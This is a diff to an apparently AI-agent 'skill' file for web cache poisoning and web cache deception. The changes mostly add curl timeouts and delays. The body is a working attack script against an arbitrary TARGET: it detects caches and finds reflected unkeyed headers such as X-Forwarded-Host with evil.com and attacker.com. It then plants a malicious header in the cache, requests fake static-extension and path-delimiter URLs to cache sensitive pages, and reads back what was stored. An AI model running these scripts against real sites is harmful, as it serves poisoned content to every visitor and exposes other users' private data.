@@ -1,19 +1,17 @@
 ---
 name: cache-attack
 description: Poison CDN cache or deceive when X-Cache header is detected.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, cache-poisoning, WCD, web-cache, CDN]
-    category: recon
-    related_skills:
-      - wp-mass-recon
-      - cors-credential-wordpress
-      - staging-subdomain-hunt
+compatibility: Requires curl
+tags: [recon, cache-poisoning, WCD, web-cache, CDN]
+category: recon
+related_skills:
+  - wp-mass-recon
+  - cors-credential-wordpress
+  - staging-subdomain-hunt
 ---
 
 # Cache Attack Skill
@@ -29,7 +27,7 @@ Web Cache Poisoning (WCP) and Web Cache Deception (WCD) methodology. WCP poisons
 
 ## Prerequisites
 
-- `terminal` tool with curl.
+- `terminal` with curl.
 - Cache buster parameter for safe testing (`?cb=RANDOM`).
 - Patience: cache poisoning requires precise timing and may need multiple attempts.
 
@@ -37,15 +35,15 @@ Web Cache Poisoning (WCP) and Web Cache Deception (WCD) methodology. WCP poisons
 
 ```bash
 # Phase 1: Detect cache
-curl -skI "https://TARGET/" | grep -iE "age|x-cache|cf-cache-status|via|server"
+curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/" | grep -iE "age|x-cache|cf-cache-status|via|server"
 
 # Phase 2: Test cache storage (two identical requests)
-curl -skI "https://TARGET/?cb=TEST1" | grep -iE "x-cache|cf-cache-status"
-curl -skI "https://TARGET/?cb=TEST1" | grep -iE "x-cache|cf-cache-status"
+curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/?cb=TEST1" | grep -iE "x-cache|cf-cache-status"
+curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/?cb=TEST1" | grep -iE "x-cache|cf-cache-status"
 # Second response should show HIT if caching works
 
 # Phase 3: Test unkeyed header reflection
-curl -skI "https://TARGET/" -H "X-Forwarded-Host: evil.com" | grep -i "location\|evil.com"
+curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/" -H "X-Forwarded-Host: evil.com" | grep -i "location\|evil.com"
 ```
 
 ## Quick Reference
@@ -80,7 +78,7 @@ TARGET="$1"
 echo "[*] Cache detection on $TARGET"
 
 # Check for cache headers
-RESP=$(curl -skI --max-time 10 "https://$TARGET/" 2>/dev/null)
+RESP=$(curl -skI --max-time 10 --connect-timeout 10 "https://$TARGET/" 2>/dev/null)
 
 echo "Cache headers:"
 echo "$RESP" | grep -iE "age|x-cache|cf-cache-status|via|x-served-by|x-cache-hits|x-timer|server"
@@ -102,12 +100,12 @@ echo "[*] Cache storage test:"
 CACHE_BUSTER="cb=$(date +%s)"
 
 echo -n "  Request 1: "
-curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/?$CACHE_BUSTER" -H "X-Cache-Debug: 1"
+curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "https://$TARGET/?$CACHE_BUSTER" -H "X-Cache-Debug: 1"
 echo ""
 sleep 2
 
 echo -n "  Request 2: "
-curl -sk -o /dev/null -w "X-Cache: %header{x-cache} | Age: %header{age}" "https://$TARGET/?$CACHE_BUSTER" 2>/dev/null
+curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "X-Cache: %header{x-cache} | Age: %header{age}" "https://$TARGET/?$CACHE_BUSTER" 2>/dev/null
 echo ""
 
 # Test Age increment on repeated requests (no cache buster)
@@ -154,7 +152,7 @@ for header in "${UNKEYED_HEADERS[@]}"; do
   key=$(echo "$header" | cut -d: -f1)
   value=$(echo "$header" | cut -d: -f2- | xargs)
 
-  resp=$(curl -skI --max-time 10 "https://$TARGET/?$CACHE_BUSTER" -H "$header" 2>/dev/null)
+  resp=$(curl -skI --max-time 10 --connect-timeout 10 "https://$TARGET/?$CACHE_BUSTER" -H "$header" 2>/dev/null)
   if echo "$resp" | grep -qi "$value"; then
     echo "  [REFLECTED] $key: $value"
     echo "    $(echo "$resp" | grep -i "location\|$value" | head -1)"
@@ -174,7 +172,7 @@ echo "[*] Cache poisoning test with $PAYLOAD"
 
 # Step 1: Poison — send request with malicious header
 echo "[1] Poisoning cache..."
-POISON_RESP=$(curl -sk "https://$TARGET/?$CACHE_BUSTER" -H "$PAYLOAD" -o /dev/null -w "%{http_code}" 2>/dev/null)
+POISON_RESP=$(curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/?$CACHE_BUSTER" -H "$PAYLOAD" -o /dev/null -w "%{http_code}" 2>/dev/null)
 echo "  Poison request: HTTP $POISON_RESP"
 
 sleep 2
@@ -187,7 +185,7 @@ if [[ -n "$CACHE_HIT" ]]; then
 
   # Step 3: Read cached response (without the header)
   echo "[3] Reading cached response..."
-  CACHED=$(curl -sk "https://$TARGET/?$CACHE_BUSTER" 2>/dev/null)
+  CACHED=$(curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/?$CACHE_BUSTER" 2>/dev/null)
   if echo "$CACHED" | grep -q "$MALICIOUS"; then
     echo "  [CRITICAL] POISON STORED IN CACHE!"
     echo "  Malicious content served to all users of this URL"
@@ -213,7 +211,7 @@ for ext in ".css" ".js" ".json" ".png" ".ico"; do
   echo "  Testing: $WCD_URL"
 
   # Step 1: Force cache with fake static extension
-  curl -sk "https://$TARGET$WCD_URL" -H "X-Forwarded-Host: attacker.com" \
+  curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET$WCD_URL" -H "X-Forwarded-Host: attacker.com" \
     -H "Accept: text/css,*/*" -o /tmp/wcd_test_$$.txt 2>/dev/null
 
   # Step 2: Check if sensitive data was cached
@@ -228,13 +226,15 @@ for ext in ".css" ".js" ".json" ".png" ".ico"; do
     fi
   fi
   rm -f /tmp/wcd_test_$$.txt
+  sleep 0.5
 done
 
 # Test path delimiter tricks
 for delim in ";.css" "%2f..%2findex.css" "..;.css"; do
   WCD_URL="${SENSITIVE_URL}${delim}"
-  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$WCD_URL" 2>/dev/null)
+  code=$(curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "https://$TARGET$WCD_URL" 2>/dev/null)
   [[ "$code" != "404" ]] && echo "  [POTENTIAL] $WCD_URL → HTTP $code"
+  sleep 0.3
 done
 ```
 
